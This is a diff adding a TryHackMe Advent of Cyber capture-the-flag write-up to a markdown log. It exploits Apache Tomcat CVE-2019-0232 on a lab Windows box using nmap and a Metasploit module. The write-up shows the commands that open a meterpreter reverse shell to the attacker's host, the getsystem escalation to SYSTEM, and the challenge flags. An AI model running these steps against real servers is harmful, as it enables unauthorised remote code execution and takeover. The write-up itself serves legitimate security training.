@@ -17,7 +17,7 @@ Event Homepage: [`https://tryhackme.com/christmas`](https://tryhackme.com/christ
 - [x] [Day 9 - Anyone can be Santa!](#day-9-anyone-can-be-santa)
 - [x] [Day 10 - Don't be Elfish!](#day-10-dont-be-elfish)
 - [x] [Day 11 - The Rogue Gnome](#day-11-the-rogue-gnome)
-- [ ] Day 12 - Ready, set, elf.
+- [x] [Day 12 - Ready, set, elf.](#day-12-ready-set-elf)
 - [ ] Day 13 - Coal for Christmas
 - [ ] Day 14 - Where's Rudolph?
 - [ ] Day 15 - There's a Python in my stocking!
@@ -900,6 +900,8 @@ bash-4.4# whoami
 root
 ```
 
+***Another way to find the misconfigured SUID binaries would be to use [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)***
+
 ### Getting the flag
 
 Now that I am root, getting the flag is very straight forward. All we need to do is `cat` the flag!
@@ -909,3 +911,272 @@ cat /root/flag.txt
 ```
 
 Flag: `thm{2fb10afe933296592}`
+
+## Day 12: Ready, set, elf!
+
+*Category: Networking*
+*Tags: Public Exploits*
+
+> Learn how vulnerabilities can be identified, use public knowledgebases to search for exploits and leverage these on this Windows box; So quit slackin' and get whackin'!
+
+IP: `10.10.143.182`
+
+### Vulnerability Knowledge Bases
+
+Examples include:
+- Rapid7
+- AttackerKB
+- MITRE
+- Exploit-DB
+
+### Basic enumeration
+
+Before we begin, we ping the machine:
+
+```
+mshen@dragonfly:~/ctf/thm/thm-advent/day12-ready-set-elf$ ping 10.10.143.182
+PING 10.10.143.182 (10.10.143.182) 56(84) bytes of data.
+^C
+--- 10.10.143.182 ping statistics ---
+4 packets transmitted, 0 received, 100% packet loss, time 3065ms
+```
+
+Interesting, this machine doesn't respond to ping requests... anyways, we shall forge ahead.
+
+First, we can use Nmap to scan the machine.
+
+```
+nmap -sC -sV -Pn -oN nmap.log 10.10.143.182
+```
+
+We get the following results:
+
+```log
+# Nmap 7.80 scan initiated Sat Dec 12 14:14:26 2020 as: nmap -sC -sV -Pn -oN nmap.log 10.10.143.182
+Nmap scan report for 10.10.143.182
+Host is up (0.11s latency).
+Not shown: 997 filtered ports
+PORT     STATE SERVICE       VERSION
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: TBFC-WEB-01
+|   NetBIOS_Domain_Name: TBFC-WEB-01
+|   NetBIOS_Computer_Name: TBFC-WEB-01
+|   DNS_Domain_Name: tbfc-web-01
+|   DNS_Computer_Name: tbfc-web-01
+|   Product_Version: 10.0.17763
+|_  System_Time: 2020-12-12T19:14:46+00:00
+| ssl-cert: Subject: commonName=tbfc-web-01
+| Not valid before: 2020-11-27T01:29:04
+|_Not valid after:  2021-05-29T01:29:04
+|_ssl-date: 2020-12-12T19:14:47+00:00; -1s from scanner time.
+8009/tcp open  ajp13         Apache Jserv (Protocol v1.3)
+| ajp-methods: 
+|_  Supported methods: GET HEAD POST OPTIONS
+8080/tcp open  http          Apache Tomcat 9.0.17
+|_http-favicon: Apache Tomcat
+|_http-title: Apache Tomcat/9.0.17
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Dec 12 14:14:48 2020 -- 1 IP address (1 host up) scanned in 21.81 seconds
+```
+
+### What is the version number of the web server?
+
+We can see the HTTP Apache Tomcat server is running on port 8080. In the Nmap scan, we can also see that the version number is `9.0.17`.
+
+Here is what the webpage looks like if we open it in a browser:
+
+![screenshot](day12-ready-set-elf/apache_tomcat.png)
+
+Based on the lesson writeup from CMNatic, I also check out `http://10.10.143.182:8080/cgi-bin/elfwhacker.bat` and I found this:
+
+```
+-------------------------------------------------------
+Written by ElfMcEager for The Best Festival Company ~CMNatic
+-------------------------------------------------------
+
+Current time: 12/12/2020 20:33:34.06
+
+-------------------------------------------------------
+                 Debugging Information
+-------------------------------------------------------
+Hostname: TBFC-WEB-01
+User: tbfc-web-01\elfmcskidy
+
+-------------------------------------------------------
+                  ELF WHACK COUNTER
+-------------------------------------------------------
+
+ Number of Elves whacked and sent back to work: 31469
+```
+
+### Finding the vulnerability using searchsploit
+
+I used [CVE Details](https://www.cvedetails.com/version/280286/Apache-Tomcat-9.0.17.html) to find the vulnerabilities affecting `Apache Tomcat v9.0.17`.
+
+![screenshot](day12-ready-set-elf/cve_details_overview.png)
+
+I then found out that [`CVE-2019-0232`](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-887/version_id-280286/year-2019/opec-1/Apache-Tomcat-9.0.17.html) would allow me to gain remote code execution.
+
+![screenshot](day12-ready-set-elf/cve_details_vuln.png)
+
+The description say:
+
+```
+When running on Windows with enableCmdLineArguments enabled, the CGI Servlet in Apache Tomcat 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39 and 7.0.0 to 7.0.93 is vulnerable to Remote Code Execution due to a bug in the way the JRE passes command line arguments to Windows. The CGI Servlet is disabled by default. The CGI option enableCmdLineArguments is disable by default in Tomcat 9.0.x (and will be disabled by default in all versions in response to this vulnerability). For a detailed explanation of the JRE behaviour, see Markus Wulftange's blog (https://codewhitesec.blogspot.com/2016/02/java-and-command-line-injections-in-windows.html) and this archived MSDN blog (https://web.archive.org/web/20161228144344/https://blogs.msdn.microsoft.com/twistylittlepassagesallalike/2011/04/23/everyone-quotes-command-line-arguments-the-wrong-way/).
+```
+
+### Running the exploit using Metasploit
+
+We start metasploit by running `msfconsole`.
+
+First, we search and select the exploit we would like to use:
+
+```
+msf6 > search 2019-0232
+
+Matching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  exploit/windows/http/tomcat_cgi_cmdlineargs  2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
+
+
+msf6 > use exploit/windows/http/tomcat_cgi_cmdlineargs
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) >
+```
+
+Next, let's check out which options we need to set:
+
+```
+msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > show options
+
+Module options (exploit/windows/http/tomcat_cgi_cmdlineargs):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      8080             yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       The URI path to CGI script
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     172.16.57.163    yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Apache Tomcat 9.0 or prior for Windows
+```
+
+We need to set the `RHOST` to the THM box, the `LHOST` to my Try Hack Me IP address and the `TARGETURI` to `/cgi-bin/elfwhacker.bat`.
+
+```
+msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set RHOSTS 10.10.143.182
+RHOSTS => 10.10.143.182
+msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set LHOSTS 10.6.23.34
+LHOST => 10.6.23.34
+msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set TARGETURI /cgi-bin/elfwhacker.bat
+TARGETURI => /cgi-bin/elfwhacker.bat
+```
+
+Then, I can run the exploit to get a shell!
+
+```
+msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > run
+
+[*] Started reverse TCP handler on 10.6.23.34:4444 
+[*] Executing automatic check (disable AutoCheck to override)
+[+] The target is vulnerable.
+[*] Command Stager progress -   6.95% done (6999/100668 bytes)
+[*] Command Stager progress -  13.91% done (13998/100668 bytes)
+[*] Command Stager progress -  20.86% done (20997/100668 bytes)
+[*] Command Stager progress -  27.81% done (27996/100668 bytes)
+[*] Command Stager progress -  34.76% done (34995/100668 bytes)
+[*] Command Stager progress -  41.72% done (41994/100668 bytes)
+[*] Command Stager progress -  48.67% done (48993/100668 bytes)
+[*] Command Stager progress -  55.62% done (55992/100668 bytes)
+[*] Command Stager progress -  62.57% done (62991/100668 bytes)
+[*] Command Stager progress -  69.53% done (69990/100668 bytes)
+[*] Command Stager progress -  76.48% done (76989/100668 bytes)
+[*] Command Stager progress -  83.43% done (83988/100668 bytes)
+[*] Command Stager progress -  90.38% done (90987/100668 bytes)
+[*] Command Stager progress -  97.34% done (97986/100668 bytes)
+[*] Command Stager progress - 100.02% done (100692/100668 bytes)
+[*] Sending stage (175174 bytes) to 10.10.143.182
+[*] Meterpreter session 1 opened (10.6.23.34:4444 -> 10.10.143.182:49907) at 2020-12-12 15:39:53 -0500
+
+meterpreter > shell
+Process 3992 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi-bin>whoami
+whoami
+tbfc-web-01\elfmcskidy
+
+```
+
+### Getting the flag
+
+Now that we have a Windows Command Prompt, the real challenge has begun: actually using it LOL (ok, you see, i'm much more comfortable in a UNIX terminal...)
+
+We use `dir` and `type` instead of `ls` and `cat` respectively.
+
+```
+C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi-bin>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 4277-4242
+
+ Directory of C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi-bin
+
+12/12/2020  20:39    <DIR>          .
+12/12/2020  20:39    <DIR>          ..
+19/11/2020  21:39               825 elfwhacker.bat
+19/11/2020  22:06                27 flag1.txt
+12/12/2020  20:39            73,802 vzlXv.exe
+               3 File(s)         74,654 bytes
+               2 Dir(s)  13,497,925,632 bytes free
+
+C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi-bin>type flag1.txt
+type flag1.txt
+thm{whacking_all_the_elves}
+```
+
+And now we have the flag!
+
+Flag: `thm{whacking_all_the_elves}`
+
+### Privilege Escalation
+
+There is an extra challenge! Privilege escalation was actually made very very simple with Metasploit.
+
+```
+meterpreter > getuid
+Server username: TBFC-WEB-01\elfmcskidy
+meterpreter > getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+(note: since this is a windows box, `NT AUTHORITY\SYSTEM == root`)
+
+Although, I assume there is another flag2.txt or something on this box, unfortunately, I was not able to find it...
